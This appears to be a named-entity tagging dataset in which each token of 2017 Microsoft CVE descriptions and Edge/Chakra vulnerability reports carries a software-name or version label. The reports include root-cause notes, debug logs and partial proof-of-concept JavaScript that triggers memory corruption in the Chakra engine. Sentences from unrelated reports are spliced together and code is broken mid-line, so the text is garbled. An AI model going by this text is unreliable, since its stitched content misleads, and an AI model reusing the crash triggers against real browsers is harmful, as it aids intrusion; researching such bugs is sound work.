SP1 SV
, O
Windows SN
Server SV
2008 SV
SP2 SV
and SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
and SV
R2 SV
, O
and O
Internet O
Explorer O
and O
Microsoft O
Edge O
in O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allow O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
the O
way O
that O
the O
Microsoft O
browser O
JavaScript O
engines O
render O
content O
when O
handling O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8649 O
, O
CVE-2017-8660 O
, O
CVE-2017-8729 O
, O
CVE-2017-8738 O
, O
CVE-2017-8740 O
, O
CVE-2017-8741 O
, O
CVE-2017-8748 O
, O
CVE-2017-8752 O
, O
CVE-2017-8753 O
, O
CVE-2017-8755 O
, O
CVE-2017-8756 O
, O
and O
CVE-2017-11764 O
. O

Microsoft O
Edge O
in O
Microsoft SN
Windows SN
10 SV
1703 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
the O
way O
that O
the O
Microsoft O
Edge O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

So O
it O
ends O
up O
emitting O
an O
incorrect O
opcode O
Js O
: O
:OpCode O
: O
:StLocalSlot O
. O

This O
is O
a O
feature O
called O
DeferParse O
. O

The O
feature O
is O
enabled O
in O
Edge O
by O
default O
. O

The O
problem O
is O
that O
the O
bytecode O
generated O
for O
f O
when O
the O
feature O
is O
enabled O
is O
different O
to O
the O
bytecode O
generated O
when O
the O
feature O
is O
disabled O
. O

But O
with O
the O
feature O
, O
the O
method O
is O
not O
called O
. O

Microsoft O
Edge O
Chakra O
- O
Deferred O
Parsing O
Makes O
Wrong O
Scopes O

Microsoft O
Edge O
in O
Microsoft SN
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
the O
way O
that O
the O
Microsoft O
Edge O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8649 O
, O
CVE-2017-8660 O
, O
CVE-2017-8729 O
, O
CVE-2017-8740 O
, O
CVE-2017-8741 O
, O
CVE-2017-8748 O
, O
CVE-2017-8752 O
, O
CVE-2017-8753 O
, O
CVE-2017-8755 O
, O
CVE-2017-8756 O
, O
and O
CVE-2017-11764 O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8731 O
, O
CVE-2017-8751 O
, O
and O
CVE-2017-11766 O
. O

Microsoft O
Edge O
in O
Microsoft SN
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
the O
way O
that O
Microsoft O
Edge O
accesses O
objects O
in O
memory O
, O
aka O
Microsoft O
Edge O
Memory O
Corruption O
Vulnerability O
. O

The O
vulnerability O
has O
been O
confirmed O
on O
Microsoft SN
Edge SN
38.14393.1066.0 SV
( O
Microsoft SN
Edge SN
HTML O
14.14393 O
) O
as O
well O
as O
Microsoft O
Edge O
40.15063.0.0 SV
( O
Microsoft O
EdgeHTML O
15.15063 O
) O
. O

Debug O
log O
1 O
: O
( O
1790.17bc O
) O
: O
Access O
violation O
- O
code O
c0000005 O
( O
first O
chance O
) O
First O
chance O
exceptions O
are O
reported O
before O
any O
exception O
handling O
. O

However O
I O
verified O
that O
the O
bug O
also O
affects O
the O
latest O
version O
. O

In O
that O
case O
an O
out-of-bounds O
read O
can O
be O
reliably O
observed O
in O
COptionsCollectionCacheItem O
: O
:GetAt O
function O
( O
see O
Debug O
Log O
2 O
below O
) O
. O

Note O
: O
Debug O
logs O
were O
obtained O
on O
an O
older O
version O
of O
Edge O
for O
which O
symbols O
were O
available O
. O

Thus O
if O
an O
attacker O
requests O
an O
object O
that O
is O
past O
the O
end O
of O
the O
cache O
buffer O
( O
note O
: O
the O
offset O
is O
chosen O
by O
the O
attacker O
) O
an O
incorrect O
object O
may O
be O
returned O
which O
can O
potentially O
be O
turned O
into O
a O
remote O
code O
execution O
. O

Debug O
log O
2 O
( O
with O
Page O
Heap O
on O
for O
MicrosoftEdgeCP.exe O
and O
MemGC O
disabled O
) O
: O
( O
de8.13c8 O
) O
: O
Access O
violation O
- O
code O
c0000005 O
( O
first O
chance O
) O
First O
chance O
exceptions O
are O
reported O
before O
any O
exception O
handling O
. O

edgehtml O
! O
COptionsCollectionCacheItem O
: O
:GetAt+0x51 O
: O
00007ffa`c96b1581 O
488b04d0 O
mov O
rax O
, O
qword O
ptr O
[ O
rax+rdx O
8 O
] O
ds:000001b6`52743000 O

Note O
that O
multiple O
page O
refreshes O
are O
usually O
needed O
to O
get O
the O
crash O
. O

chakra O
! O
Js O
: O
:CrossSite O
: O
:MarshalVar+0x37 O
: O
00007ffa`c8dc23f7 O
488b4808 O
mov O
rcx O
, O
qword O
ptr O
[ O
rax+8 O
] O
ds:00000001`afccb7dc O

Microsoft SN
Edge SN
38.14393.1066.0 SV
- O
COptionsCollectionCacheItem O
: O
:GetAt O
Out-of-Bounds O
Read O

Microsoft O
Edge O
in O
Microsoft SN
Windows SN
10 SV
1607 SV
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
the O
way O
that O
Microsoft O
Edge O
accesses O
objects O
in O
memory O
, O
aka O
Microsoft O
Edge O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8734 O
, O
CVE-2017-8751 O
, O
and O
CVE-2017-11766 O
. O

By O
making O
DOM O
modifications O
before O
the O
document O
had O
a O
chance O
of O
fully O
loading O
, O
followed O
by O
another O
set O
of O
DOM O
modifications O
afer O
the O
page O
has O
been O
loaded O
, O
it O
is O
possible O
to O
trigger O
memory O
corruption O
that O
could O
possibly O
lead O
to O
an O
exploitable O
condition O
. O

Note O
that O
the O
crash O
RIP O
directly O
preceeds O
a O
( O
CFG-protected O
) O
indirect O
call O
, O
which O
demonstrates O
the O
exploitability O
of O
the O
issue O
. O

If O
Edge O
displays O
a O
HTML O
document O
from O
a O
slow O
HTTP O
server O
, O
it O
is O
possible O
that O
a O
part O
of O
the O
document O
is O
going O
to O
be O
rendered O
before O
the O
server O
has O
finished O
sending O
the O
document O
. O

It O
is O
also O
possible O
that O
some O
JavaScript O
code O
is O
going O
to O
trigger O
. O

Simply O
run O
server.py O
and O
point O
Edge O
to O
this O
has O
been O
tested O
on O
Microsoft SN
Edge SN
38.14393.1066.0 SV
( O
Microsoft O
EdgeHTML O
14.14393 O
) O
Debug O
log O
: O
( O
a68.9c0 O
) O
: O
Access O
violation O
- O
code O
c0000005 O
( O
first O
chance O
) O
First O
chance O
exceptions O
are O
reported O
before O
any O
exception O
handling O
. O

A O
debug O
log O
is O
included O
below O
. O

Microsoft SN
Edge SN
38.14393.1066.0 SV
- O
Memory O
Corruption O
with O
Partial O
Page O
Loading O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8649 O
, O
CVE-2017-8660 O
, O
CVE-2017-8738 O
, O
CVE-2017-8740 O
, O
CVE-2017-8741 O
, O
CVE-2017-8748 O
, O
CVE-2017-8752 O
, O
CVE-2017-8753 O
, O
CVE-2017-8755 O
, O
CVE-2017-8756 O
, O
and O
CVE-2017-11764 O
. O

So O
the O
object O
literal O
will O
have O
incorrect O
members O
( O
b O
= O
0x1111 O
, O
c O
= O
0x2222 O
) O
, O
this O
leads O
to O
type O
confusion O
( O
Chakra O
will O
think O
c O
is O
a O
setter O
and O
try O
to O
call O
it O
) O
. O

The O
problem O
is O
that O
Parser O
: O
:ParseTerm O
also O
parses O
. O

, O
etc O
. O

using O
ParsePostfixOperators O
without O
proper O
checks O
. O

In O
the O
following O
PoC O
, O
ConvertObjectToObjectPattern O
skips O
{ O
b O
= O
0x1111 O
... O
} O
.c O
. O

As O
a O
result O
, O
an O
invalid O
syntax O
( O
i.e. O
, O
{ O
b O
= O
0x1111 O
... O
} O
.c O
) O
can O
be O
parsed O
and O
ConvertObjectToObjectPattern O
will O
fail O
to O
convert O
it O
to O
an O
object O
pattern O
. O

Microsoft O
Edge O
- O
Chakra O
Incorrectly O
Parses O
Object O
Patterns O

Microsoft SN
Windows SN
Server SV
2008 SV
SP2 SV
and SV
R2 SV
SP1 SV
, O
Windows SN
7 SV
SP1 SV
, O
Windows SN
8.1 SV
and SV
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
and SV
R2 SV
, O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allow O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
how O
Microsoft O
Windows O
Text O
Services O
Framework O
handles O
objects O
in O
memory O
, O
aka O
Windows O
Shell O
Memory O
Corruption O
Vulnerability O
. O

Microsoft O
Edge O
in O
Microsoft SN
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
how O
affected O
Microsoft O
scripting O
engines O
handle O
objects O
in O
memory O
, O
aka O
Microsoft O
Edge O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11794 O
and O
CVE-2017-11803 O
. O

Microsoft O
Edge O
in O
Microsoft SN
Windows SN
10 SV
1703 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
due O
to O
the O
way O
that O
Microsoft O
browser O
JavaScript O
engines O
render O
content O
when O
handling O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8634 O
, O
CVE-2017-8635 O
, O
CVE-2017-8636 O
, O
CVE-2017-8638 O
, O
CVE-2017-8639 O
, O
CVE-2017-8640 O
, O
CVE-2017-8641 O
, O
CVE-2017-8645 O
, O
CVE-2017-8646 O
, O
CVE-2017-8647 O
, O
CVE-2017-8655 O
, O
CVE-2017-8656 O
, O
CVE-2017-8657 O
, O
CVE-2017-8670 O
, O
CVE-2017-8671 O
, O
and O
CVE-2017-8672 O
. O

Microsoft O
Edge O
in O
Microsoft SN
Windows SN
10 SV
1511 SV
, O
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
due O
to O
the O
way O
that O
Microsoft O
browser O
JavaScript O
engines O
render O
content O
when O
handling O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8634 O
, O
CVE-2017-8635 O
, O
CVE-2017-8636 O
, O
CVE-2017-8638 O
, O
CVE-2017-8639 O
, O
CVE-2017-8640 O
, O
CVE-2017-8641 O
, O
CVE-2017-8645 O
, O
CVE-2017-8646 O
, O
CVE-2017-8647 O
, O
CVE-2017-8655 O
, O
CVE-2017-8656 O
, O
CVE-2017-8657 O
, O
CVE-2017-8670 O
, O
CVE-2017-8671 O
, O
and O
CVE-2017-8674 O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8634 O
, O
CVE-2017-8635 O
, O
CVE-2017-8636 O
, O
CVE-2017-8638 O
, O
CVE-2017-8639 O
, O
CVE-2017-8640 O
, O
CVE-2017-8641 O
, O
CVE-2017-8645 O
, O
CVE-2017-8646 O
, O
CVE-2017-8647 O
, O
CVE-2017-8655 O
, O
CVE-2017-8656 O
, O
CVE-2017-8657 O
, O
CVE-2017-8670 O
, O
CVE-2017-8672 O
, O
and O
CVE-2017-8674 O
. O

Therefore O
, O
the O
value O
of O
args.Info.Count O
becomes O
0 O
. O

So O
args.Info.Count O
must O
always O
be O
1 O
or O
greater O
. O

If O
the O
flag O
is O
set O
, O
the O
value O
of O
args.Info.Count O
will O
be O
decremented O
again O
in O
the O
next O
routine O
( O
ArgumentReader O
: O
:AdjustArguments O
) O
because O
the O
last O
value O
of O
the O
arguments O
is O
not O
used O
as O
an O
actual O
argument O
. O

Var O
JavascriptFunction O
: O
:EntryCall O
( O
RecyclableObject O
function O
, O
CallInfo O
callInfo O
PROBE_STACK O
( O
function- O
> O
GetScriptContext O
( O
) O
, O
Js O
: O
:Constants O
: O
:MinStackDefault O
) O
; O
RUNTIME_ARGUMENTS O
( O
args O
, O
callInfo O
) O
; O
ScriptContext O
scriptContext O
= O
function- O
> O
GetScriptContext O
( O
) O
; O
Assert O
( O
! O

But O
the O
problem O
is O
that O
the O
method O
decrements O
args.Info.Count O
by O
one O
without O
considering O
the O
flag O
CallFlags_ExtraArg O
. O

Microsoft O
Edge O
in O
Microsoft SN
Windows SN
10 SV
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
due O
to O
the O
way O
that O
Microsoft O
browser O
JavaScript O
engines O
render O
content O
when O
handling O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8634 O
, O
CVE-2017-8635 O
, O
CVE-2017-8636 O
, O
CVE-2017-8638 O
, O
CVE-2017-8639 O
, O
CVE-2017-8640 O
, O
CVE-2017-8641 O
, O
CVE-2017-8645 O
, O
CVE-2017-8646 O
, O
CVE-2017-8647 O
, O
CVE-2017-8655 O
, O
CVE-2017-8656 O
, O
CVE-2017-8657 O
, O
CVE-2017-8671 O
, O
CVE-2017-8672 O
, O
and O
CVE-2017-8674 O
. O

But O
this O
time O
, O
it O
happends O
in O
Parser O
: O
:ParseFncFormals O
with O
the O
PNodeFlags O
: O
:fpnArguments_overriddenInParam O
flag O
. O

Microsoft O
Edge O
Chakra O
- O
Uninitialized O
Arguments O
( O
2 O
) O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8653 O
. O

Microsoft O
browsers O
in O
Microsoft SN
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
R2 SV
, O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allow O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
due O
to O
Microsoft O
browsers O
improperly O
handling O
objects O
in O
memory O
while O
rendering O
content O
, O
aka O
Microsoft O
Browser O
Memory O
Corruption O
Vulnerability O
. O

Microsoft SN
Outlook SN
2007 SV
SP3 SV
, O
Outlook SN
2010 O
SP2 SV
, O
Outlook SN
2013 SV
SP1 SV
, O
Outlook SN
2013 SV
RT SV
SP1 SV
, O
and O
Outlook SN
2016 SV
as O
packaged O
in O
Microsoft O
Office O
allows O
a O
remote O
code O
execution O
vulnerability O
due O
to O
the O
way O
Microsoft O
Outlook O
parses O
specially O
crafted O
email O
messages O
, O
aka O
Microsoft O
Office O
Outlook O
Memory O
Corruption O
Vulnerability O

Microsoft O
Edge O
in O
Microsoft SN
Windows SN
10 SV
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
due O
to O
the O
way O
affected O
Microsoft O
scripting O
engines O
render O
when O
handling O
objects O
in O
memory O
, O
aka O
Microsoft O
Edge O
Memory O
Corruption O
Vulnerability O
. O

Microsoft O
Edge O
in O
Microsoft SN
Windows SN
10 SV
1511 SV
, O
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
the O
way O
that O
Microsoft O
browser O
JavaScript O
engines O
render O
content O
when O
handling O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8649 O
, O
CVE-2017-8729 O
, O
CVE-2017-8738 O
, O
CVE-2017-8740 O
, O
CVE-2017-8741 O
, O
CVE-2017-8748 O
, O
CVE-2017-8752 O
, O
CVE-2017-8753 O
, O
CVE-2017-8755 O
, O
CVE-2017-8756 O
, O
and O
CVE-2017-11764 O
. O

A O
remote O
code O
execution O
vulnerability O
exists O
in O
the O
way O
that O
the O
Chakra O
JavaScript O
engine O
renders O
when O
handling O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8634 O
, O
CVE-2017-8635 O
, O
CVE-2017-8636 O
, O
CVE-2017-8638 O
, O
CVE-2017-8639 O
, O
CVE-2017-8640 O
, O
CVE-2017-8641 O
, O
CVE-2017-8645 O
, O
CVE-2017-8646 O
, O
CVE-2017-8647 O
, O
CVE-2017-8655 O
, O
CVE-2017-8656 O
, O
CVE-2017-8670 O
, O
CVE-2017-8671 O
, O
CVE-2017-8672 O
, O
and O
CVE-2017-8674 O
. O

All O
rights O
reserved O
. O

Flags O
: O
allow-natives-syntax O
assertEquals O
= O
print O
; O
var O
m O
= O
( O
function O
( O
) O
{ O
use O
asm O
; O
function O
f O
( O
x O
) O
{ O
return O
x O
< O
0 O
; O
} O
function O
g O
( O
x O
) O
{ O
return O
0 O
< O
x O
; O
} O
return O
{ O
f O
: O
f O
, O
g O
: O
g O
var O
f O
= O
m.f O
; O
var O
g O
= O
m.g O
; O
var O
counter O
= O
0 O
; O
function O
deopt O
( O
f O
) O
{ O
return O
{ O
toString O
: O
function O
( O
) O
{ O
print O
( O
f O
) O
; O
counter++ O
; O
return O
2 O
assertEquals O
( O
false O
, O
f O
( O
deopt O
( O
f O
) O
) O
) O
; O
assertEquals O
( O
1 O
, O
counter O
) O
; O
assertEquals O
( O
true O
, O
g O
( O
deopt O
( O
g O
) O
) O
) O
; O
assertEquals O
( O
2 O
, O
counter O
) O
; O
print O
( O
f O
) O
; O
assertEquals O
( O
false O
, O
f O
( O
deopt O
( O
f O
) O
) O
) O
; O
assertEquals O
( O
3 O
, O
counter O
) O
; O
print O
( O
g O
) O
; O
assertEquals O
( O
true O
, O
g O
( O
deopt O
( O
g O
) O
) O
) O
; O
assertEquals O
( O
4 O
, O
counter O
) O
; O

Use O
of O
this O
source O
code O
is O
governed O
by O
a O
BSD-style O
license O
that O
can O
be O
found O
in O
the O
LICENSE O
file O
. O

In O
the O
debug O
build O
of O
Chakra O
, O
this O
script O
hits O
the O
following O
assert O
: O
ASSERTION O
19041 O
: O
( O
/home/user/test_everywhere/ChakraCore/lib/Common/DataStructures/List.h O
, O
line O
329 O
) O
index O
> O
= O
0 O
& O
& O
index O
< O
this- O
> O
count O
Failure O
: O
( O
index O
> O
= O
0 O
& O
& O
index O
< O
this- O
> O
count O
) O
Illegal O
instruction O
( O
core O
dumped O
) O
The O
attached O
script O
is O
a O
test O
case O
from O
the O
v8 O
( O
Chrome O
) O
test O
repository O
, O
minimized O
to O
show O
the O
issue O
. O

The O
out-of-bounds O
value O
is O
then O
treated O
as O
the O
pointer O
to O
the O
source O
. O

testRunner.waitUntilDone O
( O
) O
; O
++promiseTestCount O
; O
return O
promiseTestChain.then O
( O
test_promise O
) O
; O
} O
; O
assertUnoptimized O
= O
function O
assertUnoptimized O
( O
fun O
, O
sync_opt O
, O
name_opt O
) O
{ O
if O
( O
sync_opt O
undefined O
) O
sync_opt O
var O
opt_status O
= O
OptimizationStatus O
( O
fun O
, O
sync_opt O
) O
; O
Tests O
that O
use O
assertOptimized O
( O
) O
do O
not O
make O
sense O
if O
always-opt O
option O
is O
provided O
. O

Such O
tests O
must O
add O
no-always-opt O
to O
flags O
comment O
. O

This O
is O
likely O
an O
exploitable O
condition O
. O

Such O
tests O
must O
add O
opt O
to O
flags O
comment O
. O

The O
attached O
JavaScript O
file O
causes O
an O
out-of-bounds O
access O
of O
the O
source O
buffer O
when O
fetching O
the O
source O
for O
one O
of O
the O
functions O
during O
delayed O
compilation O
. O

Microsoft O
Edge O
- O
Out-of-Bounds O
Access O
when O
Fetching O
Source O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8634 O
, O
CVE-2017-8635 O
, O
CVE-2017-8636 O
, O
CVE-2017-8638 O
, O
CVE-2017-8639 O
, O
CVE-2017-8640 O
, O
CVE-2017-8641 O
, O
CVE-2017-8645 O
, O
CVE-2017-8646 O
, O
CVE-2017-8647 O
, O
CVE-2017-8655 O
, O
CVE-2017-8657 O
, O
CVE-2017-8670 O
, O
CVE-2017-8671 O
, O
CVE-2017-8672 O
, O
and O
CVE-2017-8674 O
. O

This O
function O
is O
supposed O
to O
call O
SetIsCatch O
for O
all O
the O
symbols O
in O
the O
exception O
parameter O
. O

void O
PreVisitCatch O
( O
ParseNode O
pnode O
, O
ByteCodeGenerator O
byteCodeGenerator O
) O
{ O
Push O
the O
catch O
scope O
and O
add O
the O
catch O
expression O
to O
it O
. O

The O
one O
for O
the O
whole O
function O
scope O
is O
initialized O
with O
undefined O
at O
the O
start O
of O
the O
function O
. O

( O
pnode- O
> O
sxVar.isBlockScopeFncDeclVar O
& O
& O
sym- O
> O
GetIsBlockVar O
if O
( O
sym- O
> O
GetIsCatch O
pnode- O
> O
nop O
knopVarDecl O
& O
& O
sym- O
> O
GetIsBlockVar O
sym O
= O
funcInfo- O
> O
bodyScope- O
> O
FindLocalSymbol O
( O
sym- O
> O
GetName O
( O
) O
) O
; O
This O
returns O
the O
symbol O
for O
the O
function O
scope O
. O

If O
the O
bytecode O
generator O
incorrectly O
chooses O
the O
x O
to O
initialize O
, O
the O
x O
for O
the O
function O
scope O
may O
remain O
uninitialized O
. O

The O
PoC O
reproduces O
that O
case O
, O
the O
x O
for O
the O
function O
scope O
will O
refer O
to O
an O
uninitialized O
value O
in O
the O
stack O
. O

This O
choice O
is O
made O
in O
the O
following O
code O
in O
ByteCodeGenerator O
: O
:DefineUserVars O
. O

void O
ByteCodeGenerator O
: O
:DefineUserVars O
( O
FuncInfo O
funcInfo O
for O
( O
pnode O
= O
funcInfo- O
> O
root- O
> O
sxFnc.pnodeVars O
; O
pnode O
; O
pnode O
= O
pnode- O
> O
sxVar.pnodeNext O
) O
{ O
Symbol O
sym O
= O
pnode- O
> O
sxVar.sym O
; O
if O
( O
sym O
! O
= O
nullptr O
& O
& O
! O

Microsoft O
Edge O
in O
Microsoft SN
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
due O
to O
the O
way O
that O
Microsoft O
browser O
JavaScript O
engines O
render O
content O
when O
handling O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8634 O
, O
CVE-2017-8635 O
, O
CVE-2017-8636 O
, O
CVE-2017-8638 O
, O
CVE-2017-8639 O
, O
CVE-2017-8640 O
, O
CVE-2017-8641 O
, O
CVE-2017-8645 O
, O
CVE-2017-8646 O
, O
CVE-2017-8647 O
, O
CVE-2017-8656 O
, O
CVE-2017-8657 O
, O
CVE-2017-8670 O
, O
CVE-2017-8671 O
, O
CVE-2017-8672 O
, O
and O
CVE-2017-8674 O
. O

Microsoft O
browsers O
in O
Microsoft SN
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
SP2 SV
and SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
and SV
R2 SV
, O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allow O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
due O
to O
Microsoft O
browsers O
improperly O
accessing O
objects O
in O
memory O
, O
aka O
Microsoft O
Browser O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8669 O
. O

Internet O
Explorer O
in O
Microsoft O
Windows SN
Server SV
2008 SV
SP2 SV
and O
Windows SN
Server SV
2012 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
due O
to O
Internet O
Explorer O
improperly O
accessing O
objects O
in O
memory O
, O
aka O
Internet O
Explorer O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8634 O
, O
CVE-2017-8635 O
, O
CVE-2017-8636 O
, O
CVE-2017-8638 O
, O
CVE-2017-8639 O
, O
CVE-2017-8640 O
, O
CVE-2017-8641 O
, O
CVE-2017-8645 O
, O
CVE-2017-8646 O
, O
CVE-2017-8655 O
, O
CVE-2017-8656 O
, O
CVE-2017-8657 O
, O
CVE-2017-8670 O
, O
CVE-2017-8671 O
, O
CVE-2017-8672 O
, O
and O
CVE-2017-8674 O
. O

Microsoft O
Edge O
in O
Windows SN
10 SV
1703 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
due O
to O
the O
way O
that O
Microsoft O
browser O
JavaScript O
engines O
render O
content O
when O
handling O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

Microsoft O
Edge O
in O
Windows SN
10 SV
1511 SV
, O
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
due O
to O
the O
way O
that O
Microsoft O
browser O
JavaScript O
engines O
render O
content O
when O
handling O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8634 O
, O
CVE-2017-8635 O
, O
CVE-2017-8636 O
, O
CVE-2017-8638 O
, O
CVE-2017-8639 O
, O
CVE-2017-8640 O
, O
CVE-2017-8641 O
, O
CVE-2017-8645 O
, O
CVE-2017-8647 O
, O
CVE-2017-8655 O
, O
CVE-2017-8656 O
, O
CVE-2017-8657 O
, O
CVE-2017-8670 O
, O
CVE-2017-8671 O
, O
CVE-2017-8672 O
, O
and O
CVE-2017-8674 O
. O

So O
it O
should O
be O
used O
like O
PushPopFrameHelper O
holder O
but O
InterpreterStackFrame O
: O
:ProcessLinkFailedAsmJsModule O
uses O
it O
like O
a O
function O
. O

The O
PoC O
will O
crash O
in O
the O
following O
code O
. O

Var O
InterpreterStackFrame O
: O
:ProcessLinkFailedAsmJsModule O
PushPopFrameHelper O
( O
newInstance O
, O
_ReturnAddress O
( O
) O
, O
_AddressOfReturnAddress O
It O
pushes O
newInstance O
and O
immediately O
pop O
it O
. O

} O
function O
f O
( O
v O
) O
{ O
v O
= O
v O
| O
0 O
; O
return O
v O
| O
0 O
; O
} O
return O
f O
; O
} O
asmModule O
( O
1 O
) O
; O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8634 O
, O
CVE-2017-8635 O
, O
CVE-2017-8636 O
, O
CVE-2017-8638 O
, O
CVE-2017-8639 O
, O
CVE-2017-8640 O
, O
CVE-2017-8641 O
, O
CVE-2017-8646 O
, O
CVE-2017-8647 O
, O
CVE-2017-8655 O
, O
CVE-2017-8656 O
, O
CVE-2017-8657 O
, O
CVE-2017-8670 O
, O
CVE-2017-8671 O
, O
CVE-2017-8672 O
, O
and O
CVE-2017-8674 O
. O

But O
it O
incorrectly O
handles O
the O
case O
where O
the O
function O
is O
a O
class O
. O

In O
the O
PoC O
, O
it O
binds O
the O
information O
of O
the O
method O
f O
( O
f2 O
in O
the O
latest O
release O
version O
of O
Edge O
) O
to O
the O
constructor O
. O

The O
PoC O
hits O
the O
following O
assertion O
in O
the O
debug O
build O
. O

So O
it O
may O
result O
in O
binding O
incorrect O
information O
to O
the O
constructor O
. O

It O
starts O
to O
parse O
from O
the O
start O
of O
the O
class O
declaration O
instead O
of O
the O
constructor O
. O

FuncInfo O
ByteCodeGenerator O
: O
:StartBindFunction O
( O
const O
char16 O
name O
, O
uint O
nameLength O
, O
uint O
shortNameOffset O
, O
bool O
pfuncExprWithName O
, O
ParseNode O
pnode O
, O
Js O
: O
:ParseableFunctionInfo O
reuseNestedFunc O
) O
{ O
bool O
funcExprWithName O
; O
Js O
: O
:ParseableFunctionInfo O
parseableFunctionInfo O
= O
nullptr O
; O
Js O
: O
:AutoRestoreFunctionInfo O
autoRestoreFunctionInfo O
( O
reuseNestedFunc O
, O
reuseNestedFunc O

